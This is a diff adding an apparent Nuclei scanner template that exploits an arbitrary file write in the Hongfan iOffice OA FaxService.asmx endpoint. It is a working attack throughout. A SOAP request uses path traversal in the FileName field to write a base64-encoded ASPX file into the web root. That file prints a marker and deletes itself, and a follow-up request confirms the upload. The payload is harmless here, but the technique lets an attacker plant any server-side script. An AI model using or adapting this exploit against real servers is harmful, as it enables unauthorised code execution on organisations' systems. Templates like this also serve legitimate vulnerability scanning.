@@ -1,0 +1,39 @@
+id: hf-iOffice-FaxService-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: oa红帆FaxService.asmx任意文件写入
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/ee0c74e68ec95b82a4e4ebcdb961d6ed18a44b77/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86FaxService.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5.py#L36
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: http://tempuri.org/SaveConvertTif
+        Content-Length: 471
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <SaveConvertTif xmlns="http://tempuri.org/">
+              <FaxID>1</FaxID>
+              <Pages>2</Pages>
+              <FileName>../../../../{{filename}}.aspx</FileName>
+              <FileContent>IDwlIFJlc3BvbnNlLldyaXRlIGNocigxMDEpJmNocig0OSkmY2hyKDU0KSZjaHIoNTMpJmNocig1MikmY2hyKDUwKSZjaHIoNDkpJmNocig0OSkmY2hyKDQ5KSZjaHIoNDgpJmNocig5OCkmY2hyKDk3KSZjaHIoNDgpJmNocig1MSkmY2hyKDQ4KSZjaHIoNTcpJmNocig1NykmY2hyKDk3KSZjaHIoNDkpJmNocig5OSkmY2hyKDQ4KSZjaHIoNTEpJmNocig1NykmY2hyKDUxKSZjaHIoNTEpJmNocig1NSkmY2hyKDUxKSZjaHIoOTkpJmNocig1MykmY2hyKDk4KSZjaHIoNTIpJmNocig1MSkgQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpLkRlbGV0ZUZpbGUoc2VydmVyLm1hcHBhdGgoUmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoIlNDUklQVF9OQU1FIikpKSAlPg==</FileContent>
+            </SaveConvertTif>
+          </soap:Body>
+        </soap:Envelope>
+      - |+
+        GET /iOffice/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba030'
